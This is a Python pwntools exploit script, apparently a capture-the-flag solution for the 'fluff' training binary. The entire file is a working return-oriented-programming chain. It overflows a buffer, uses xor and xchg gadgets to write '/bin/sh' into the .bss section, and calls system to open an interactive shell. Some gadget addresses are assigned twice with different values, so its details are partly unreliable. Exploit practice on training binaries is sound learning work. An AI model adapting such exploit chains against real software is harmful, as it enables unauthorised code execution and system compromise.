#!/usr/bin/python
# -*- coding:utf8 -*-

from pwn import *

elf = ELF("./fluff")
sh = process("./fluff")

bss_addr = 0x00601060
pop_rdi = 0x00400893
pop_rsi_r15 = 0x00400891
mov_rsi_edi = 0x00400821

system_plt = elf.plt["system"]
bss_addr = 0x00601060
pop_r12 = 0x00400832			# pop r12 ; mov r13d, 0x604060 ; ret
xor_r11_r11 = 0x00400822		# xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; ret
xor_r11_r12 = 0x0040082f		# xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; ret
xchg_r11_r10 = 0x00400840		# xchg r11, r10 ; pop r15 ; mov r11d, 0x602050 ; ret
mov_r10_r11 = 0x0040084e		# mov qword ptr [r10], r11 ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; ret
pop_rdi = 0x004008c3

payload = ""
payload += "A"*40
payload += p64(pop_r12)
payload += p64(bss_addr)
payload += p64(xor_r11_r11)
payload += "A"*8
payload += p64(xor_r11_r12)
payload += "A"*8
payload += p64(xchg_r11_r10)
payload += "A"*8

payload += p64(pop_r12)
payload += "/bin/sh\x00"		# "sh\x00\x00\x00\x00\x00\x00"
payload += p64(xor_r11_r11)
payload += "A"*8
payload += p64(xor_r11_r12)
payload += "A"*8

payload += p64(mov_r10_r11)
payload += "A"*8
payload += p64(0)
payload += p64(pop_rdi)
payload += p64(bss_addr)
payload += p64(system_plt)

sh.sendline(payload)
sh.interactive()